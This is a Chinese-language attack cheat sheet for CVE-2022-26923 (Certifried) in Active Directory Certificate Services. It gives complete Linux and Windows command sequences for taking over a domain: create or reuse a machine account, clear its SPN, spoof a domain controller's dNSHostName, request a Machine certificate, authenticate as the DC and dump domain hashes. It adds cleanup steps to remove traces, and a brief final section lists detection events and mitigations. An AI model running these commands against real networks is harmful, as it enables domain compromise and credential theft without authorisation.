# CVE-2022-26923 Certifried 机器账户证书欺骗

利用机器账户 dNSHostName 属性修改 + SPN 自动更新机制，以低权限域用户身份申请域控机器证书，通过 PKINIT 认证获取域控权限。

---

## 原理

- 域用户默认可创建最多 10 个机器账户（ms-DS-MachineAccountQuota）
- 机器账户的 dNSHostName 属性可被其创建者修改
- 修改 dNSHostName 时，SPN 中的 hostname 部分会自动同步更新
- Machine 证书模板默认用 dNSHostName 作为证书身份标识
- 攻击流程：创建机器账户 → 清除 SPN（避免冲突检查）→ 修改 dNSHostName 为 DC 的 FQDN → 申请 Machine 模板证书 → 获取域控身份证书

### 关键点
- 清除 SPN 是必要步骤：否则 SPN 自动更新会与现有 DC 的 SPN 冲突，修改被拒绝
- Machine 模板是默认启用的，无需特殊配置

---

## 检测是否已修补

```bash
# 申请证书后检查是否包含 objectSid 扩展
certipy req -u '$USER@$DOMAIN' -p '$PASS' -dc-ip $DC_IP -target $ADCS -ca '$CA' -template 'Machine'

# 已修补的 CA 会在证书中嵌入 objectSid (OID 1.3.6.1.4.1.311.25.2)
# 未修补: 证书无 objectSid → 可利用
# 已修补: 证书含 objectSid → 身份绑定到原始机器账户，无法欺骗
```

---

## 前置条件

- 域用户凭据（需要创建机器账户或控制已有机器账户）
- ms-DS-MachineAccountQuota >= 1（默认值 10）
- CA 服务器启用 Machine 模板（默认启用）
- CA 未安装 2022 年 5 月补丁

### 检查 MachineAccountQuota

```bash
netexec ldap $DC_IP -u $USER -p $PASS -M maq
# 或
bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC_IP get object 'DC=domain,DC=com' --attr ms-DS-MachineAccountQuota
```

---

## Linux 攻击流程

### 方式一：Certipy 一步创建（推荐）

```bash
# 创建机器账户并自动设置 dNSHostName（一步完成）
certipy account create -u '$USER@$DOMAIN' -p '$PASS' -user '$COMPUTER' -pass '$COMPUTER_PASS' -dns '$DC.$DOMAIN'

# 申请 Machine 模板证书
certipy req -u '$COMPUTER$@$DOMAIN' -p '$COMPUTER_PASS' -dc-ip $DC_IP -target $ADCS -ca '$CA' -template 'Machine'

# Pass-the-Certificate 认证
certipy auth -pfx $DC.pfx -dc-ip $DC_IP
# 输出: DC$ NTLM Hash

# DCSync
secretsdump -hashes :$NTHASH '$DOMAIN/$DC$'@$DC_IP
```

### 方式二：手动分步操作

```bash
# 1. 创建机器账户
addcomputer.py -computer-name '$COMPUTER' -computer-pass '$COMPUTER_PASS' '$DOMAIN/$USER:$PASS' -dc-ip $DC_IP

# 2. 清除 SPN（关键步骤，避免冲突检查）
bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC_IP set object '$COMPUTER$' serviceprincipalname

# 3. 修改 dNSHostName 为目标 DC 的 FQDN
bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC_IP set object '$COMPUTER$' dnsHostName -v '$DC.$DOMAIN'

# 4. 申请 Machine 模板证书
certipy req -u '$COMPUTER$@$DOMAIN' -p '$COMPUTER_PASS' -dc-ip $DC_IP -target $ADCS -ca '$CA' -template 'Machine'

# 5. 认证
certipy auth -pfx $DC.pfx -dc-ip $DC_IP
```

### 使用已控制的机器账户

如果已有机器账户控制权（无需创建新账户）：

```bash
# 直接清除 SPN + 修改 dNSHostName
bloodyAD -d $DOMAIN -u '$COMPUTER$' -p '$COMPUTER_PASS' --host $DC_IP set object '$COMPUTER$' serviceprincipalname
bloodyAD -d $DOMAIN -u '$COMPUTER$' -p '$COMPUTER_PASS' --host $DC_IP set object '$COMPUTER$' dnsHostName -v '$DC.$DOMAIN'

# 申请证书 + 认证
certipy req -u '$COMPUTER$@$DOMAIN' -p '$COMPUTER_PASS' -dc-ip $DC_IP -target $ADCS -ca '$CA' -template 'Machine'
certipy auth -pfx $DC.pfx -dc-ip $DC_IP
```

---

## Windows 攻击方式

```powershell
# 1. 创建机器账户
New-MachineAccount -MachineAccount $COMPUTER -Password $(ConvertTo-SecureString '$COMPUTER_PASS' -AsPlainText -Force)

# 2. 清除 SPN + 修改 dNSHostName
Set-ADComputer $COMPUTER -ServicePrincipalName @{}
Set-ADComputer $COMPUTER -DnsHostName '$DC.$DOMAIN'

# 3. 申请证书
Certify.exe request /ca:$ADCS\$CA /template:Machine

# 4. 转换并认证
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Rubeus.exe asktgt /user:$DC$ /certificate:cert.pfx /ptt
```

---

## 与 ESC1 的区别

| 对比项 | Certifried (CVE-2022-26923) | ESC1 |
|--------|---------------------------|------|
| 利用模板 | Machine（默认启用） | 需要错误配置的自定义模板 |
| 核心手法 | 修改机器账户 dNSHostName | 申请时指定 SAN |
| 前置条件 | 可创建机器账户 + 未修补 CA | 存在允许 SAN 的模板 |
| 补丁修复 | CA 在证书中嵌入 objectSid | 需修改模板配置 |
| 隐蔽性 | 创建机器账户有日志 | 仅证书申请日志 |

---

## 攻击后清理

```bash
# 删除创建的机器账户
bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC_IP remove object '$COMPUTER$'
# 或
addcomputer.py -computer-name '$COMPUTER' -delete '$DOMAIN/$USER:$PASS' -dc-ip $DC_IP
```

---

## 检测与防御

### 日志检测
- **Event ID 4741**: 计算机账户被创建
- **Event ID 4742**: 计算机账户被修改（dNSHostName 变更）
- **Event ID 4887**: 证书申请（CA 日志）
- 关注 dNSHostName 被修改为其他主机名的事件

### 防御措施
- 安装 2022 年 5 月 KB5014754 补丁
- 将 ms-DS-MachineAccountQuota 设为 0
- 监控机器账户 dNSHostName 属性变更
- 审计 Machine 模板的证书申请记录
